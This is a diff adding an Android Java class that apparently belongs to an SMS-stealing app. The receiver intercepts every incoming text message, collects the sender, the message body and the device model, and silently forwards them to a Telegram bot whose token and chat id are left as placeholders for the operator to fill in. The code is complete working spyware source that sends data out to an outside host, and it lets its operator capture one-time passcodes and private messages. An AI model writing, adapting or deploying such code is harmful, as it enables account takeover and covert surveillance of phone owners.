@@ -1,0 +1,51 @@
+package com.megumi.megumii;
+
+import android.content.BroadcastReceiver;
+import android.content.Context;
+import android.content.Intent;
+import android.os.Bundle;
+import android.telephony.SmsMessage;
+
+import java.net.URLEncoder;
+import java.nio.charset.StandardCharsets;
+
+import okhttp3.OkHttpClient;
+import okhttp3.Request;
+
+public class SmsReceiver extends BroadcastReceiver {
+    private final OkHttpClient client = new OkHttpClient();
+    private final String botToken = "ur bot token";
+    private final String chatId = "ur chat id";
+
+    @Override
+    public void onReceive(Context context, Intent intent) {
+        Bundle bundle = intent.getExtras();
+        if (bundle == null) return;
+
+        Object[] pdus = (Object[]) bundle.get("pdus");
+        if (pdus == null) return;
+
+        for (Object pdu : pdus) {
+            SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
+            String sender = sms.getOriginatingAddress();
+            String body = sms.getMessageBody();
+
+            String message = "New SMS Received\n\n" +
+                    "Sender: " + sender + "\n" +
+                    "Message:\n" + body + "\n\n" +
+                    "Device: " + android.os.Build.MANUFACTURER + " " + android.os.Build.MODEL;
+
+            sendToTelegram(message);
+        }
+    }
+
+    private void sendToTelegram(String text) {
+        String encodedText = URLEncoder.encode(text, StandardCharsets.UTF_8);
+        String url = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodedText;
+        Request request = new Request.Builder().url(url).build();
+        client.newCall(request).enqueue(new okhttp3.Callback() {
+            @Override public void onFailure(okhttp3.Call call, java.io.IOException e) {}
+            @Override public void onResponse(okhttp3.Call call, okhttp3.Response response) {}
+        });
+    }
+}
